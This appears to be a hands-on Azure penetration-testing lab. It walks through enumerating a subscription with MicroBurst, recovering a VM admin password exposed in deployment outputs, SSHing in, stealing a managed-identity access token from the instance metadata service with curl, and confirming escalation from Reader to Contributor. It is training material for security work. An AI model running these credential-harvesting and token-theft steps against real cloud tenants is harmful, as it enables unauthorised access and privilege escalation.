
### Lab 5A - Credential Hunting
In this hands-on exercise, we will use the MicroBurst function – **`Get-AzDomainInfo`** to perform an authenticated enumeration of our Azure environment. 
* **NOTE**: For larger environments, you may need to restrict the information that MicroBurst is collecting. By using the Boolean flags associated with the parameters (Users, Groups, and so on), you can disable collecting information that you may not need. Note that user and group collection can take a long time for tenants with lots of users.


1. In a PowerShell console on your pentest VM, use the following commands to authenticate to Entra ID (Azure AD) and Azure as the **`readeruser`**. Replace the **`USERNAME`** and **`PASSWORD`** placeholders with the real values from the **`LABXX-Info`** exercise file.

```
$username = "USERNAME"
$password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Connect-AzAccount -Credential $cred
Connect-AzureAD -Credential $cred
```

2. Import the MicroBurst module into your PowerShell session with the following commands:
* If you receive some error messages about AzureRm, please ignore (AzureRm is deprecated and will be removed in a future release)
```
cd "$env:SystemDrive\PentestTools\Azure\Attack\MicroBurst"
Import-Module .\MicroBurst.psm1
```

3. Create a folder called **`microburst-output`** to store the output of the function that we are about to run using the following command:
```
New-Item -Name "microburst-output" -ItemType "directory"
```

4. Run the MicroBurst function to enumerate the Azure subscription using the following command. When a window opens displaying the subscription, click **`OK`** to proceed:
```
Get-AzDomainInfo -Verbose -Folder microburst-output
```
* The function will output the enumerated results in CSV and the text files will be stored in the specified output folder.

5. Open the output folder using the following command. This will open the **`microburst-output`** folder in File Explorer:
```
Invoke-Item -Path "$env:SystemDrive\PentestTools\Azure\Attack\MicroBurst\microburst-output"
```

6. You will see a single folder called Az in the opened view. Review the contents of the files and folders specified as follows. The content contains the resource inventory collected by the function (you can open the CSV files with Visual Studio Code):
* **`Az –> <Subscription Name> –> Users.csv`**: The content contains the user list collected by the function
* **`Az –> <Subscription Name> –> RBAC`**: The content contains lists of privileged users collected by the function

7. Open the text file where the enumerated resource group deployment information is stored. The file will be in the **`microburst-output –> Az –> <Subscription Name> –> Resources`** folder:

```
Invoke-Item -Path "$env:SystemDrive\PentestTools\Azure\Attack\MicroBurst\microburst-output\Az\ProdSubscription\Resources\Deployments.txt"
```

8. You should see a **`vmName`**, **`adminUsername`**, and **`adminPassword`** in the output. Copy the SSH command that is displayed in the **`Output`** (You can use CNTRL + F to find this) and paste it into PowerShell. Type **`yes`** and press **`Enter`** when prompted about the fingerprint. Enter the password that you copied from the deployment file and press Enter.

9. You should now have shell access to the Linux VM using the credentials exposed in the resource group deployment output. From here, we can look for opportunities to move laterally or escalate privileges. In this case, let's check to see whether this Linux VM has a managed identity associated with it. As part of checking for the managed identity, we will be querying the Azure Instance Metadata Service (IMDS).

* **Important note**
  * The IMDS is a REST API endpoint that is available at a non-routable IP address (169.254.169.254) from within a VM instance. It can be used to obtain information about the instance platform configuration and to request access tokens if the instance is assigned a managed identity. It requires a specific header (Metadata:true) to be present, so this typically requires you to make requests to the service via command execution. You can learn more about it from this documentation: https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service.

10. Review the Azure VM instance metadata to obtain more information about how the VM is configured in Azure. You can do this with the following commands:
```
curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01" | jq
```

11. Check whether the VM has an associated managed identity using the following command. If one is used, an **`access_token`** will be returned and this could present an opportunity to escalate privileges:
```
curl -H Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' | jq
```

12. You can see here that we got an access token for the Azure management plane (Resource Manager). This token can now be used to interact with the Azure REST APIs. 

13. While we could use the access token with the Azure REST APIs, it's much easier to use the Azure CLI to interact with the subscription. Log in with the VM's managed identity using the following command:
```
az login --identity
```

14. Let's verify the permissions that this identity has using the following two commands.
First, we will make a request for the LinuxVM resource information and cast it to the appid variable. In another environment, the $HOSTNAME environment variable can also be referenced instead of the hardcoded VM name used here:
```
appid=$(az resource list --query "[?name=='LinuxVM'].identity.principalId" --output tsv)
```

15. Using the appid variable, we will list the role assignments for the subscription, specifically querying for the principal name, role name, type, and scope:
```
az role assignment list --assignee $appid --include-groups --include-inherited --query '[].{username:principalName, role:roleDefinitionName, usertype:principalType, scope:scope}'
```

Awesome! This VM has the Contributor role applied at the subscription scope! This means that we now have write access to the subscription. We hunted for a credential that gave us a path to escalated permissions from Reader to Contributor.
